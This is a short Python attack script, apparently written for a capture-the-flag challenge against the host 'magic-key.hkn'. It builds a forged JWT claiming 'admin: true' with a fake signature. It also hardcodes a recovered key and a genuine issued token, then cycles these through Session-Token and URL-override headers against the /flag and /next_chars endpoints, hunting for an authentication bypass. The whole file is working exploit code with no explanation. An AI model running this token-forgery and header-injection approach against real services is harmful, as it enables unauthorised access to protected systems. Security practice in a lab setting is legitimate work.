#!/usr/bin/env python3
import base64, json, time, requests

def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode().rstrip("=")

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

KEY_NOPREFIX = "C%{6bSUAs52sI@$K8Ouk0"
KEY_PREFIX = "pwd:C%{6bSUAs52sI@$K8Ouk0"

# Rebuild the forged admin:true JWT (same as before)
header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

# The REAL JWT issued by magic-key.hkn/keycheck when we submit the correct key (admin:false)
real_issued_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsInRpbWVzdGFtcCI6MTc5MjE0MzMyNX0.UDt9LKouwS5on0iRcT_0xynjjOSa_zcWMbZXWa8yeLI"

candidates = [
    ("plaintext key w/ pwd: prefix", KEY_PREFIX),
    ("base64 key w/ pwd: prefix", b64(KEY_PREFIX)),
    ("plaintext forged admin:true JWT", forged_jwt),
    ("base64 forged admin:true JWT", b64(forged_jwt)),
    ("plaintext real issued JWT (admin:false)", real_issued_jwt),
    ("base64 real issued JWT (admin:false)", b64(real_issued_jwt)),
]

TARGET = "magic-key.hkn"

for label, token in candidates:
    print(f"### Session-Token = {label} ###")
    for url_header_name in ("URL", "URL-Maybe"):
        for path in ("/flag", "/next_chars"):
            params = {"char": "s"} if path == "/next_chars" else None
            r = requests.get(f"http://{TARGET}{path}", params=params, headers={
                "Session-Token": token,
                url_header_name: "/flag"
            }, timeout=5)
            tag = f"{path} + {url_header_name}:/flag"
            print(f"  {tag} -> {r.status_code}: {r.text.strip()[:150]}")
    print()
